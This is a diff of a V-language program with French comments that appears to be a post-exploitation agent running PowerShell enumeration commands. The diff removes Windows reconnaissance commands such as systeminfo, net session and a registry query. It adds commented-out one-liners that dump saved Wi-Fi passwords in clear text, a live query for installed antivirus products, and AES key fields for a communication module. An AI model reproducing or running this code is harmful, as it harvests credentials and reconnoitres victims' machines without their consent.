@@ -38,21 +38,17 @@ struct Response{
 
 struct SharedVariable {
 	agent_identifier string = "<id-agent>" // de la forme "agent-x" ou x est le numèro de l'agent
+	cryptkey []u8 = [u8(0)] // la clé de chiffrement pour le module d'écoute ou d'envoi
+	iv []u8 = [u8(0)] // le vecteur d'initialisation pour le chiffrement aes-256-cbc
 
 	number_of_module int = 3
 
     commandes_list []Commande = [
-		Commande{command: "systeminfo", type_shell: ShellType.powershell, id: "SYSTEMINFO"},
-		Commande{command: "ver", type_shell: ShellType.powershell, id: "WINVER"},
-		Commande{command: "wmic cpu get datawidth /format:list", type_shell: ShellType.powershell, id: "NBBITS"},
-		Commande{command: "fsutil fsinfo drives", type_shell: ShellType.powershell, id: "DRIVES"},
-		Commande{command: "wmic logicaldisk get description,name", type_shell: ShellType.powershell, id: "DESCDRIVES"},
-		Commande{command: "set", type_shell: ShellType.powershell, id: "VARENV"},
-		Commande{command: "dir /a c:\\pagefile.sys", type_shell: ShellType.powershell, id: "LASTREBOOT"},
-		Commande{command: "net share", type_shell: ShellType.powershell, id: "SHARES"},
-		Commande{command: "net session", type_shell: ShellType.powershell, id: "SESSIONS"},
-		Commande{command: "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\\", type_shell: ShellType.powershell, id: "MOUNTEDSHARES"},
-		Commande{command: "nbtstat -n", type_shell: ShellType.powershell, id: "NBSTSTAT"},
+		//Commande{command: '\$tmp_networks = (netsh wlan show profile | select-string "Profil Tous les");\$networks = ((\$tmp_networks -split (\':\') -split (\'Profil Tous les utilisateurs\')) | Select-String \'[A-Z]|[0-9]\') -replace " ","";foreach(\$network in \$networks){ netsh wlan show profile \$network key=clear}', type_shell: ShellType.powershell, id: "SYSTEMINFO"},
+		//Commande{command: '\"netsh wlan show profiles | Select-String \": \" | ForEach-Object { \$_.ToString().Split(\":\")[1].Trim() } | ForEach-Object { netsh wlan show profile name=\$_ key=clear | Select-String \"Contenu de la clé\" } | ForEach-Object { \$_.ToString().Split(\":\")[1].Trim() }\"', type_shell: ShellType.powershell, id: "SYSTEMINFO"},
+		//Commande{command: "netsh wlan show profiles | Select-String \\': \\' | ForEach-Object { \$_.ToString().Split(\\':\\')[1].Trim() } | ForEach-Object { netsh wlan show profile name=\$_ key=clear }", type_shell: ShellType.powershell, id: "SYSTEMINFO"},
+		Commande{command: 'Get-WmiObject -Namespace "root\\SecurityCenter2" -Class AntiVirusProduct -ErrorAction Stop', type_shell: ShellType.powershell, id: "SYSTEMINFO"},
+		
 	]
 mut:
 	execution_commande_list []int
@@ -72,7 +68,7 @@ fn main(){
 		println(show_all_module_status(shared_variable))
 
 		println("\n[[[ SHARED VARIABLES ]]]")
-		dump_shared_variable(shared_variable)
+		//dump_shared_variable(shared_variable)
 	}
 		println("[i] - fin d'éxecution. Temps d'énumeration  ${sw.elapsed().seconds()}")
 }
@@ -147,7 +143,9 @@ fn (shared sv SharedVariable) module_execution() {
         if cmd.type_shell == ShellType.cmd {
             shell_command = "cmd /c " + cmd.command
         } else if cmd.type_shell == ShellType.powershell {
-            shell_command = "powershell.exe -Command " + cmd.command
+			//print("commande : " + "powershell.exe -Command " + cmd.command)
+            shell_command = "powershell.exe -Command " + cmd.command 
+			print(shell_command)
         } else if cmd.type_shell == ShellType.bash {
 			shell_command = "bash -c \'" + cmd.command + "\'"
 		}
